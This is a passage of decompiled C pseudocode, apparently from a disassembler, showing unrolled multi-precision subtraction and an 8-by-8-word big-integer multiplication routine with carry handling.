      v36 = (v35 < v34) + v14;
      a1[6] = v35 - v34;
      v37 = a2[7];
      v38 = a3[7];
      v14 = v37 < v36;
      v39 = v37 - v36;
      result = (v39 < v38) + v14;
      a1[7] = v39 - v38;
      a2 += 8;
      a3 += 8;
      a1 += 8;
      v9 -= 8;
    }
    while ( v9 );
  }
  if ( (a4 & 7) != 0 )
  {
    v40 = *a2 - result;
    result = (v40 < *a3) + (*a2 < result);
    *a1 = v40 - *a3;
    ++a2;
    ++a3;
    ++a1;
    if ( (a4 & 7) != 1 )
    {
      v41 = *a2 - result;
      result = (v41 < *a3) + (*a2 < result);
      *a1 = v41 - *a3;
      ++a2;
      ++a3;
      ++a1;
      if ( (a4 & 7) != 2 )
      {
        v42 = *a2 - result;
        result = (v42 < *a3) + (*a2 < result);
        *a1 = v42 - *a3;
        ++a2;
        ++a3;
        ++a1;
        if ( (a4 & 7) != 3 )
        {
          v43 = *a2 - result;
          result = (v43 < *a3) + (*a2 < result);
          *a1 = v43 - *a3;
          ++a2;
          ++a3;
          ++a1;
          if ( (a4 & 7) != 4 )
          {
            v44 = *a2 - result;
            result = (v44 < *a3) + (*a2 < result);
            *a1 = v44 - *a3;
            ++a2;
            ++a3;
            ++a1;
            if ( (a4 & 7) != 5 )
            {
              v45 = *a2 - result;
              result = (v45 < *a3) + (*a2 < result);
              *a1 = v45 - *a3;
              ++a2;
              ++a3;
              ++a1;
              if ( (a4 & 7) != 6 )
              {
                v46 = *a2 - result;
                result = (v46 < *a3) + (*a2 < result);
                *a1 = v46 - *a3;
                ++a2;
                ++a3;
                ++a1;
              }
            }
          }
        }
      }
    }
  }
  if ( a5 )
  {
    if ( a5 < 0 )
    {
      for ( i = -a5 & 0xFFFFFFF8; i; i -= 8 )
      {
        v48 = -result;
        v49 = (-result < *a3) + (result != 0);
        *a1 = v48 - *a3;
        v50 = a3[1];
        v51 = -v49;
        v52 = (-v49 < v50) + (v49 != 0);
        a1[1] = v51 - v50;
        v53 = a3[2];
        v54 = -v52;
        v55 = (-v52 < v53) + (v52 != 0);
        a1[2] = v54 - v53;
        v56 = a3[3];
        v57 = -v55;
        v58 = (-v55 < v56) + (v55 != 0);
        a1[3] = v57 - v56;
        v59 = a3[4];
        v60 = -v58;
        v61 = (-v58 < v59) + (v58 != 0);
        a1[4] = v60 - v59;
        v62 = a3[5];
        v63 = -v61;
        v64 = (-v61 < v62) + (v61 != 0);
        a1[5] = v63 - v62;
        v65 = a3[6];
        v66 = -v64;
        v67 = (-v64 < v65) + (v64 != 0);
        a1[6] = v66 - v65;
        v68 = a3[7];
        v69 = -v67 - v68;
        result = (-v67 < v68) + (v67 != 0);
        a1[7] = v69;
        a3 += 8;
        a1 += 8;
      }
      if ( (-(char)a5 & 7) != 0 )
      {
        v70 = -result;
        result = (-result < *a3) + (result != 0);
        *a1 = v70 - *a3;
        if ( (-(char)a5 & 7) != 1 )
        {
          v71 = a3[1];
          v72 = -result;
          result = (-result < v71) + (result != 0);
          a1[1] = v72 - v71;
          if ( (-(char)a5 & 7) != 2 )
          {
            v73 = a3[2];
            v74 = -result;
            result = (-result < v73) + (result != 0);
            a1[2] = v74 - v73;
            if ( (-(char)a5 & 7) != 3 )
            {
              v75 = a3[3];
              v76 = -result;
              result = (-result < v75) + (result != 0);
              a1[3] = v76 - v75;
              if ( (-(char)a5 & 7) != 4 )
              {
                v77 = a3[4];
                v78 = -result;
                result = (-result < v77) + (result != 0);
                a1[4] = v78 - v77;
                if ( (-(char)a5 & 7) != 5 )
                {
                  v79 = a3[5];
                  v80 = -result;
                  result = (-result < v79) + (result != 0);
                  a1[5] = v80 - v79;
                  if ( (-(char)a5 & 7) != 6 )
                  {
                    v81 = a3[6];
                    v82 = -result;
                    result = (-result < v81) + (result != 0);
                    a1[6] = v82 - v81;
                  }
                }
              }
            }
          }
        }
      }
      return result;
    }
    v83 = a5 & 0x7FFFFFF8;
    if ( (a5 & 0xFFFFFFF8) != 0 )
    {
      while ( 1 )
      {
        v14 = *a2 < result;
        *a1 = *a2 - result;
        if ( !v14 )
          goto LABEL_49;
        v84 = a2[1];
        a1[1] = v84 - result;
        if ( v84 >= result )
          goto LABEL_50;
        v85 = a2[2];
        a1[2] = v85 - result;
        if ( v85 >= result )
          goto LABEL_51;
        v86 = a2[3];
        a1[3] = v86 - result;
        if ( v86 >= result )
          goto LABEL_52;
        v87 = a2[4];
        a1[4] = v87 - result;
        if ( v87 >= result )
          goto LABEL_53;
        v88 = a2[5];
        a1[5] = v88 - result;
        if ( v88 >= result )
          goto LABEL_54;
        v89 = a2[6];
        a1[6] = v89 - result;
        if ( v89 >= result )
          goto LABEL_55;
        v90 = a2[7];
        a1[7] = v90 - result;
        if ( v90 >= result )
          break;
        a2 += 8;
        a1 += 8;
        v83 -= 8;
        if ( !v83 )
          goto LABEL_33;
      }
      while ( 1 )
      {
        a2 += 8;
        a1 += 8;
        v83 -= 8;
        if ( !v83 )
          break;
        *a1 = *a2;
LABEL_49:
        a1[1] = a2[1];
LABEL_50:
        a1[2] = a2[2];
LABEL_51:
        a1[3] = a2[3];
LABEL_52:
        a1[4] = a2[4];
LABEL_53:
        a1[5] = a2[5];
LABEL_54:
        a1[6] = a2[6];
LABEL_55:
        a1[7] = a2[7];
      }
      v91 = a5 & 7;
      if ( (a5 & 7) == 0 )
        return 0;
      *a1 = *a2;
    }
    else
    {
LABEL_33:
      v91 = a5 & 7;
      if ( (a5 & 7) == 0 )
        return result;
      v14 = *a2 < result;
      *a1 = *a2 - result;
      if ( v14 )
      {
        v92 = v91 - 1;
        if ( !v92 )
          return result;
        v93 = a2[1];
        a1[1] = v93 - result;
        if ( v93 < result )
        {
          v94 = v92 - 1;
          if ( !v94 )
            return result;
          v95 = a2[2];
          a1[2] = v95 - result;
          if ( v95 < result )
          {
            v96 = v94 - 1;
            if ( !v96 )
              return result;
            v97 = a2[3];
            a1[3] = v97 - result;
            if ( v97 < result )
            {
              v98 = v96 - 1;
              if ( !v98 )
                return result;
              v99 = a2[4];
              a1[4] = v99 - result;
              if ( v99 < result )
              {
                v100 = v98 - 1;
                if ( !v100 )
                  return result;
                v101 = a2[5];
                a1[5] = v101 - result;
                if ( v101 < result )
                {
                  if ( v100 == 1 )
                    return result;
                  v102 = a2[6];
                  a1[6] = v102 - result;
                  return v102 < result;
                }
                goto LABEL_69;
              }
LABEL_67:
              v100 = v98 - 1;
              if ( v100 )
              {
                a1[5] = a2[5];
LABEL_69:
                if ( v100 != 1 )
                  a1[6] = a2[6];
              }
              return 0;
            }
LABEL_65:
            v98 = v96 - 1;
            if ( !v98 )
              return 0;
            a1[4] = a2[4];
            goto LABEL_67;
          }
LABEL_63:
          v96 = v94 - 1;
          if ( !v96 )
            return 0;
          a1[3] = a2[3];
          goto LABEL_65;
        }
LABEL_61:
        v94 = v92 - 1;
        if ( !v94 )
          return 0;
        a1[2] = a2[2];
        goto LABEL_63;
      }
    }
    v92 = v91 - 1;
    if ( !v92 )
      return 0;
    a1[1] = a2[1];
    goto LABEL_61;
  }
  return result;
}
// 438F2D: mask 0xFFFFFFF8 is shortened because %arg_10.4 <= 0x7FFFFFFF

//----- (00439100) --------------------------------------------------------
_DWORD *__cdecl sub_439100(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  int v3; // ecx
  unsigned int v4; // edx
  unsigned __int64 v5; // rax
  bool v6; // cf
  int v7; // ecx
  unsigned __int64 v8; // kr08_8
  unsigned __int64 v9; // rax
  int v10; // ebp
  int v11; // ebx
  unsigned __int64 v12; // rax
  int v13; // ebp
  int v14; // ebx
  BOOL v15; // ett
  BOOL v16; // ecx
  unsigned __int64 v17; // rax
  int v18; // ebp
  int v19; // ebx
  BOOL v20; // ett
  int v21; // ecx
  unsigned __int64 v22; // rax
  int v23; // ebx
  int v24; // ecx
  unsigned __int64 v25; // rax
  int v26; // ebx
  int v27; // ecx
  BOOL v28; // ett
  BOOL v29; // ebp
  unsigned __int64 v30; // rax
  int v31; // ebx
  int v32; // ecx
  BOOL v33; // ett
  int v34; // ebp
  unsigned __int64 v35; // rax
  int v36; // ebx
  int v37; // ecx
  BOOL v38; // ett
  int v39; // ebp
  unsigned __int64 v40; // rax
  int v41; // ecx
  int v42; // ebp
  unsigned __int64 v43; // rax
  int v44; // ecx
  int v45; // ebp
  BOOL v46; // ett
  BOOL v47; // ebx
  unsigned __int64 v48; // rax
  int v49; // ecx
  int v50; // ebp
  BOOL v51; // ett
  int v52; // ebx
  unsigned __int64 v53; // rax
  int v54; // ecx
  int v55; // ebp
  BOOL v56; // ett
  int v57; // ebx
  unsigned __int64 v58; // rax
  int v59; // ecx
  int v60; // ebp
  BOOL v61; // ett
  int v62; // ebx
  unsigned __int64 v63; // rax
  int v64; // ebp
  int v65; // ebx
  unsigned __int64 v66; // rax
  int v67; // ebp
  int v68; // ebx
  BOOL v69; // ett
  BOOL v70; // ecx
  unsigned __int64 v71; // rax
  int v72; // ebp
  int v73; // ebx
  BOOL v74; // ett
  int v75; // ecx
  unsigned __int64 v76; // rax
  int v77; // ebp
  int v78; // ebx
  BOOL v79; // ett
  int v80; // ecx
  unsigned __int64 v81; // rax
  int v82; // ebp
  int v83; // ebx
  BOOL v84; // ett
  int v85; // ecx
  unsigned __int64 v86; // rax
  int v87; // ebp
  int v88; // ebx
  BOOL v89; // ett
  int v90; // ecx
  unsigned __int64 v91; // rax
  int v92; // ebx
  int v93; // ecx
  unsigned __int64 v94; // rax
  int v95; // ebx
  int v96; // ecx
  BOOL v97; // ett
  BOOL v98; // ebp
  unsigned __int64 v99; // rax
  int v100; // ebx
  int v101; // ecx
  BOOL v102; // ett
  int v103; // ebp
  unsigned __int64 v104; // rax
  int v105; // ebx
  int v106; // ecx
  BOOL v107; // ett
  int v108; // ebp
  unsigned __int64 v109; // rax
  int v110; // ebx
  int v111; // ecx
  BOOL v112; // ett
  int v113; // ebp
  unsigned __int64 v114; // rax
  int v115; // ebx
  int v116; // ecx
  BOOL v117; // ett
  int v118; // ebp
  unsigned __int64 v119; // rax
  int v120; // ebx
  int v121; // ecx
  BOOL v122; // ett
  int v123; // ebp
  unsigned __int64 v124; // rax
  int v125; // ecx
  int v126; // ebp
  unsigned __int64 v127; // rax
  int v128; // ecx
  int v129; // ebp
  BOOL v130; // ett
  BOOL v131; // ebx
  unsigned __int64 v132; // rax
  int v133; // ecx
  int v134; // ebp
  BOOL v135; // ett
  int v136; // ebx
  unsigned __int64 v137; // rax
  int v138; // ecx
  int v139; // ebp
  BOOL v140; // ett
  int v141; // ebx
  unsigned __int64 v142; // rax
  int v143; // ecx
  int v144; // ebp
  BOOL v145; // ett
  int v146; // ebx
  unsigned __int64 v147; // rax
  int v148; // ecx
  int v149; // ebp
  BOOL v150; // ett
  int v151; // ebx
  unsigned __int64 v152; // rax
  int v153; // ecx
  int v154; // ebp
  BOOL v155; // ett
  int v156; // ebx
  unsigned __int64 v157; // rax
  int v158; // ecx
  int v159; // ebp
  BOOL v160; // ett
  int v161; // ebx
  unsigned __int64 v162; // rax
  int v163; // ebp
  int v164; // ebx
  unsigned __int64 v165; // rax
  int v166; // ebp
  int v167; // ebx
  BOOL v168; // ett
  BOOL v169; // ecx
  unsigned __int64 v170; // rax
  int v171; // ebp
  int v172; // ebx
  BOOL v173; // ett
  int v174; // ecx
  unsigned __int64 v175; // rax
  int v176; // ebp
  int v177; // ebx
  BOOL v178; // ett
  int v179; // ecx
  unsigned __int64 v180; // rax
  int v181; // ebp
  int v182; // ebx
  BOOL v183; // ett
  int v184; // ecx
  unsigned __int64 v185; // rax
  int v186; // ebp
  int v187; // ebx
  BOOL v188; // ett
  int v189; // ecx
  unsigned __int64 v190; // rax
  int v191; // ebp
  int v192; // ebx
  BOOL v193; // ett
  int v194; // ecx
  unsigned __int64 v195; // rax
  int v196; // ebx
  int v197; // ecx
  unsigned __int64 v198; // rax
  int v199; // ebx
  int v200; // ecx
  BOOL v201; // ett
  BOOL v202; // ebp
  unsigned __int64 v203; // rax
  int v204; // ebx
  int v205; // ecx
  BOOL v206; // ett
  int v207; // ebp
  unsigned __int64 v208; // rax
  int v209; // ebx
  int v210; // ecx
  BOOL v211; // ett
  int v212; // ebp
  unsigned __int64 v213; // rax
  int v214; // ebx
  int v215; // ecx
  BOOL v216; // ett
  int v217; // ebp
  unsigned __int64 v218; // rax
  int v219; // ebx
  int v220; // ecx
  BOOL v221; // ett
  int v222; // ebp
  unsigned __int64 v223; // rax
  int v224; // ecx
  int v225; // ebp
  unsigned __int64 v226; // rax
  int v227; // ecx
  int v228; // ebp
  BOOL v229; // ett
  BOOL v230; // ebx
  unsigned __int64 v231; // rax
  int v232; // ecx
  int v233; // ebp
  BOOL v234; // ett
  int v235; // ebx
  unsigned __int64 v236; // rax
  int v237; // ecx
  int v238; // ebp
  BOOL v239; // ett
  int v240; // ebx
  unsigned __int64 v241; // rax
  int v242; // ecx
  int v243; // ebp
  BOOL v244; // ett
  int v245; // ebx
  unsigned __int64 v246; // rax
  int v247; // ebp
  int v248; // ebx
  unsigned __int64 v249; // rax
  int v250; // ebp
  int v251; // ebx
  BOOL v252; // ett
  BOOL v253; // ecx
  unsigned __int64 v254; // rax
  int v255; // ebp
  int v256; // ebx
  BOOL v257; // ett
  int v258; // ecx
  unsigned __int64 v259; // rax
  int v260; // ebp
  int v261; // ebx
  BOOL v262; // ett
  int v263; // ecx
  unsigned __int64 v264; // rax
  int v265; // ebx
  int v266; // ecx
  unsigned __int64 v267; // rax
  int v268; // ebx
  int v269; // ecx
  BOOL v270; // ett
  BOOL v271; // ebp
  unsigned __int64 v272; // rax
  int v273; // ebx
  int v274; // ecx
  BOOL v275; // ett
  int v276; // ebp
  unsigned __int64 v277; // rax
  int v278; // ecx
  int v279; // ebp
  unsigned __int64 v280; // rax
  int v281; // ecx
  int v282; // ebp
  BOOL v283; // ett
  BOOL v284; // ebx
  unsigned __int64 v285; // rax
  int v286; // ebp
  int v287; // ebx
  unsigned __int64 v288; // rax
  int v289; // ebp
  _DWORD *result; // eax

  v3 = (*a3 * (unsigned __int64)*a2) >> 32;
  v4 = *a3;
  *a1 = *a3 * *a2;
  v5 = v4 * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v5, v3);
  v7 = v5 + v3;
  v8 = HIDWORD(v5) + (unsigned __int64)v6;
  v9 = a3[1] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v9, v7), (_DWORD)v8) | __CFADD__(HIDWORD(v9), __CFADD__((_DWORD)v9, v7) + (_DWORD)v8);
  v10 = HIDWORD(v9) + __CFADD__((_DWORD)v9, v7) + (_DWORD)v8;
  HIDWORD(v9) = *a3;
  v11 = v6 + HIDWORD(v8);
  a1[1] = v9 + v7;
  v12 = HIDWORD(v9) * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v12, v10);
  v13 = v12 + v10;
  v15 = v6;
  v6 = __CFADD__(v6, v11);
  v14 = v15 + v11;
  v6 |= __CFADD__(HIDWORD(v12), v14);
  v14 += HIDWORD(v12);
  v16 = v6;
  v17 = a3[1] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v17, v13);
  v18 = v17 + v13;
  v20 = v6;
  v6 = __CFADD__(v6, v14);
  v19 = v20 + v14;
  v6 |= __CFADD__(HIDWORD(v17), v19);
  v19 += HIDWORD(v17);
  v21 = v6 + v16;
  v22 = a3[2] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v22, v18), v19);
  v23 = __CFADD__((_DWORD)v22, v18) + v19;
  v6 |= __CFADD__(HIDWORD(v22), v23);
  v23 += HIDWORD(v22);
  HIDWORD(v22) = *a3;
  v24 = v6 + v21;
  a1[2] = v22 + v18;
  v25 = HIDWORD(v22) * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v25, v23);
  v26 = v25 + v23;
  v28 = v6;
  v6 = __CFADD__(v6, v24);
  v27 = v28 + v24;
  v6 |= __CFADD__(HIDWORD(v25), v27);
  v27 += HIDWORD(v25);
  v29 = v6;
  v30 = a3[1] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v30, v26);
  v31 = v30 + v26;
  v33 = v6;
  v6 = __CFADD__(v6, v27);
  v32 = v33 + v27;
  v6 |= __CFADD__(HIDWORD(v30), v32);
  v32 += HIDWORD(v30);
  v34 = v6 + v29;
  v35 = a3[2] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v35, v31);
  v36 = v35 + v31;
  v38 = v6;
  v6 = __CFADD__(v6, v32);
  v37 = v38 + v32;
  v6 |= __CFADD__(HIDWORD(v35), v37);
  v37 += HIDWORD(v35);
  v39 = v6 + v34;
  v40 = a3[3] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v40, v36), v37);
  v41 = __CFADD__((_DWORD)v40, v36) + v37;
  v6 |= __CFADD__(HIDWORD(v40), v41);
  v41 += HIDWORD(v40);
  HIDWORD(v40) = *a3;
  v42 = v6 + v39;
  a1[3] = v40 + v36;
  v43 = HIDWORD(v40) * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v43, v41);
  v44 = v43 + v41;
  v46 = v6;
  v6 = __CFADD__(v6, v42);
  v45 = v46 + v42;
  v6 |= __CFADD__(HIDWORD(v43), v45);
  v45 += HIDWORD(v43);
  v47 = v6;
  v48 = a3[1] * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v48, v44);
  v49 = v48 + v44;
  v51 = v6;
  v6 = __CFADD__(v6, v45);
  v50 = v51 + v45;
  v6 |= __CFADD__(HIDWORD(v48), v50);
  v50 += HIDWORD(v48);
  v52 = v6 + v47;
  v53 = a3[2] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v53, v49);
  v54 = v53 + v49;
  v56 = v6;
  v6 = __CFADD__(v6, v50);
  v55 = v56 + v50;
  v6 |= __CFADD__(HIDWORD(v53), v55);
  v55 += HIDWORD(v53);
  v57 = v6 + v52;
  v58 = a3[3] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v58, v54);
  v59 = v58 + v54;
  v61 = v6;
  v6 = __CFADD__(v6, v55);
  v60 = v61 + v55;
  v6 |= __CFADD__(HIDWORD(v58), v60);
  v60 += HIDWORD(v58);
  v62 = v6 + v57;
  v63 = a3[4] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v63, v59), v60);
  v64 = __CFADD__((_DWORD)v63, v59) + v60;
  v6 |= __CFADD__(HIDWORD(v63), v64);
  v64 += HIDWORD(v63);
  HIDWORD(v63) = *a3;
  v65 = v6 + v62;
  a1[4] = v63 + v59;
  v66 = HIDWORD(v63) * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v66, v64);
  v67 = v66 + v64;
  v69 = v6;
  v6 = __CFADD__(v6, v65);
  v68 = v69 + v65;
  v6 |= __CFADD__(HIDWORD(v66), v68);
  v68 += HIDWORD(v66);
  v70 = v6;
  v71 = a3[1] * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v71, v67);
  v72 = v71 + v67;
  v74 = v6;
  v6 = __CFADD__(v6, v68);
  v73 = v74 + v68;
  v6 |= __CFADD__(HIDWORD(v71), v73);
  v73 += HIDWORD(v71);
  v75 = v6 + v70;
  v76 = a3[2] * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v76, v72);
  v77 = v76 + v72;
  v79 = v6;
  v6 = __CFADD__(v6, v73);
  v78 = v79 + v73;
  v6 |= __CFADD__(HIDWORD(v76), v78);
  v78 += HIDWORD(v76);
  v80 = v6 + v75;
  v81 = a3[3] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v81, v77);
  v82 = v81 + v77;
  v84 = v6;
  v6 = __CFADD__(v6, v78);
  v83 = v84 + v78;
  v6 |= __CFADD__(HIDWORD(v81), v83);
  v83 += HIDWORD(v81);
  v85 = v6 + v80;
  v86 = a3[4] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v86, v82);
  v87 = v86 + v82;
  v89 = v6;
  v6 = __CFADD__(v6, v83);
  v88 = v89 + v83;
  v6 |= __CFADD__(HIDWORD(v86), v88);
  v88 += HIDWORD(v86);
  v90 = v6 + v85;
  v91 = a3[5] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v91, v87), v88);
  v92 = __CFADD__((_DWORD)v91, v87) + v88;
  v6 |= __CFADD__(HIDWORD(v91), v92);
  v92 += HIDWORD(v91);
  HIDWORD(v91) = *a3;
  v93 = v6 + v90;
  a1[5] = v91 + v87;
  v94 = HIDWORD(v91) * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v94, v92);
  v95 = v94 + v92;
  v97 = v6;
  v6 = __CFADD__(v6, v93);
  v96 = v97 + v93;
  v6 |= __CFADD__(HIDWORD(v94), v96);
  v96 += HIDWORD(v94);
  v98 = v6;
  v99 = a3[1] * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v99, v95);
  v100 = v99 + v95;
  v102 = v6;
  v6 = __CFADD__(v6, v96);
  v101 = v102 + v96;
  v6 |= __CFADD__(HIDWORD(v99), v101);
  v101 += HIDWORD(v99);
  v103 = v6 + v98;
  v104 = a3[2] * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v104, v100);
  v105 = v104 + v100;
  v107 = v6;
  v6 = __CFADD__(v6, v101);
  v106 = v107 + v101;
  v6 |= __CFADD__(HIDWORD(v104), v106);
  v106 += HIDWORD(v104);
  v108 = v6 + v103;
  v109 = a3[3] * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v109, v105);
  v110 = v109 + v105;
  v112 = v6;
  v6 = __CFADD__(v6, v106);
  v111 = v112 + v106;
  v6 |= __CFADD__(HIDWORD(v109), v111);
  v111 += HIDWORD(v109);
  v113 = v6 + v108;
  v114 = a3[4] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v114, v110);
  v115 = v114 + v110;
  v117 = v6;
  v6 = __CFADD__(v6, v111);
  v116 = v117 + v111;
  v6 |= __CFADD__(HIDWORD(v114), v116);
  v116 += HIDWORD(v114);
  v118 = v6 + v113;
  v119 = a3[5] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v119, v115);
  v120 = v119 + v115;
  v122 = v6;
  v6 = __CFADD__(v6, v116);
  v121 = v122 + v116;
  v6 |= __CFADD__(HIDWORD(v119), v121);
  v121 += HIDWORD(v119);
  v123 = v6 + v118;
  v124 = a3[6] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v124, v120), v121);
  v125 = __CFADD__((_DWORD)v124, v120) + v121;
  v6 |= __CFADD__(HIDWORD(v124), v125);
  v125 += HIDWORD(v124);
  HIDWORD(v124) = *a3;
  v126 = v6 + v123;
  a1[6] = v124 + v120;
  v127 = HIDWORD(v124) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v127, v125);
  v128 = v127 + v125;
  v130 = v6;
  v6 = __CFADD__(v6, v126);
  v129 = v130 + v126;
  v6 |= __CFADD__(HIDWORD(v127), v129);
  v129 += HIDWORD(v127);
  v131 = v6;
  v132 = a3[1] * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v132, v128);
  v133 = v132 + v128;
  v135 = v6;
  v6 = __CFADD__(v6, v129);
  v134 = v135 + v129;
  v6 |= __CFADD__(HIDWORD(v132), v134);
  v134 += HIDWORD(v132);
  v136 = v6 + v131;
  v137 = a3[2] * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v137, v133);
  v138 = v137 + v133;
  v140 = v6;
  v6 = __CFADD__(v6, v134);
  v139 = v140 + v134;
  v6 |= __CFADD__(HIDWORD(v137), v139);
  v139 += HIDWORD(v137);
  v141 = v6 + v136;
  v142 = a3[3] * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v142, v138);
  v143 = v142 + v138;
  v145 = v6;
  v6 = __CFADD__(v6, v139);
  v144 = v145 + v139;
  v6 |= __CFADD__(HIDWORD(v142), v144);
  v144 += HIDWORD(v142);
  v146 = v6 + v141;
  v147 = a3[4] * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v147, v143);
  v148 = v147 + v143;
  v150 = v6;
  v6 = __CFADD__(v6, v144);
  v149 = v150 + v144;
  v6 |= __CFADD__(HIDWORD(v147), v149);
  v149 += HIDWORD(v147);
  v151 = v6 + v146;
  v152 = a3[5] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v152, v148);
  v153 = v152 + v148;
  v155 = v6;
  v6 = __CFADD__(v6, v149);
  v154 = v155 + v149;
  v6 |= __CFADD__(HIDWORD(v152), v154);
  v154 += HIDWORD(v152);
  v156 = v6 + v151;
  v157 = a3[6] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v157, v153);
  v158 = v157 + v153;
  v160 = v6;
  v6 = __CFADD__(v6, v154);
  v159 = v160 + v154;
  v6 |= __CFADD__(HIDWORD(v157), v159);
  v159 += HIDWORD(v157);
  v161 = v6 + v156;
  v162 = a3[7] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v162, v158), v159);
  v163 = __CFADD__((_DWORD)v162, v158) + v159;
  v6 |= __CFADD__(HIDWORD(v162), v163);
  v163 += HIDWORD(v162);
  HIDWORD(v162) = a3[1];
  v164 = v6 + v161;
  a1[7] = v162 + v158;
  v165 = HIDWORD(v162) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v165, v163);
  v166 = v165 + v163;
  v168 = v6;
  v6 = __CFADD__(v6, v164);
  v167 = v168 + v164;
  v6 |= __CFADD__(HIDWORD(v165), v167);
  v167 += HIDWORD(v165);
  v169 = v6;
  v170 = a3[2] * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v170, v166);
  v171 = v170 + v166;
  v173 = v6;
  v6 = __CFADD__(v6, v167);
  v172 = v173 + v167;
  v6 |= __CFADD__(HIDWORD(v170), v172);
  v172 += HIDWORD(v170);
  v174 = v6 + v169;
  v175 = a3[3] * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v175, v171);
  v176 = v175 + v171;
  v178 = v6;
  v6 = __CFADD__(v6, v172);
  v177 = v178 + v172;
  v6 |= __CFADD__(HIDWORD(v175), v177);
  v177 += HIDWORD(v175);
  v179 = v6 + v174;
  v180 = a3[4] * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v180, v176);
  v181 = v180 + v176;
  v183 = v6;
  v6 = __CFADD__(v6, v177);
  v182 = v183 + v177;
  v6 |= __CFADD__(HIDWORD(v180), v182);
  v182 += HIDWORD(v180);
  v184 = v6 + v179;
  v185 = a3[5] * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v185, v181);
  v186 = v185 + v181;
  v188 = v6;
  v6 = __CFADD__(v6, v182);
  v187 = v188 + v182;
  v6 |= __CFADD__(HIDWORD(v185), v187);
  v187 += HIDWORD(v185);
  v189 = v6 + v184;
  v190 = a3[6] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v190, v186);
  v191 = v190 + v186;
  v193 = v6;
  v6 = __CFADD__(v6, v187);
  v192 = v193 + v187;
  v6 |= __CFADD__(HIDWORD(v190), v192);
  v192 += HIDWORD(v190);
  v194 = v6 + v189;
  v195 = a3[7] * (unsigned __int64)a2[1];
  v6 = __CFADD__(__CFADD__((_DWORD)v195, v191), v192);
  v196 = __CFADD__((_DWORD)v195, v191) + v192;
  v6 |= __CFADD__(HIDWORD(v195), v196);
  v196 += HIDWORD(v195);
  HIDWORD(v195) = a3[2];
  v197 = v6 + v194;
  a1[8] = v195 + v191;
  v198 = HIDWORD(v195) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v198, v196);
  v199 = v198 + v196;
  v201 = v6;
  v6 = __CFADD__(v6, v197);
  v200 = v201 + v197;
  v6 |= __CFADD__(HIDWORD(v198), v200);
  v200 += HIDWORD(v198);
  v202 = v6;
  v203 = a3[3] * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v203, v199);
  v204 = v203 + v199;
  v206 = v6;
  v6 = __CFADD__(v6, v200);
  v205 = v206 + v200;
  v6 |= __CFADD__(HIDWORD(v203), v205);
  v205 += HIDWORD(v203);
  v207 = v6 + v202;
  v208 = a3[4] * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v208, v204);
  v209 = v208 + v204;
  v211 = v6;
  v6 = __CFADD__(v6, v205);
  v210 = v211 + v205;
  v6 |= __CFADD__(HIDWORD(v208), v210);
  v210 += HIDWORD(v208);
  v212 = v6 + v207;
  v213 = a3[5] * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v213, v209);
  v214 = v213 + v209;
  v216 = v6;
  v6 = __CFADD__(v6, v210);
  v215 = v216 + v210;
  v6 |= __CFADD__(HIDWORD(v213), v215);
  v215 += HIDWORD(v213);
  v217 = v6 + v212;
  v218 = a3[6] * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v218, v214);
  v219 = v218 + v214;
  v221 = v6;
  v6 = __CFADD__(v6, v215);
  v220 = v221 + v215;
  v6 |= __CFADD__(HIDWORD(v218), v220);
  v220 += HIDWORD(v218);
  v222 = v6 + v217;
  v223 = a3[7] * (unsigned __int64)a2[2];
  v6 = __CFADD__(__CFADD__((_DWORD)v223, v219), v220);
  v224 = __CFADD__((_DWORD)v223, v219) + v220;
  v6 |= __CFADD__(HIDWORD(v223), v224);
  v224 += HIDWORD(v223);
  HIDWORD(v223) = a3[3];
  v225 = v6 + v222;
  a1[9] = v223 + v219;
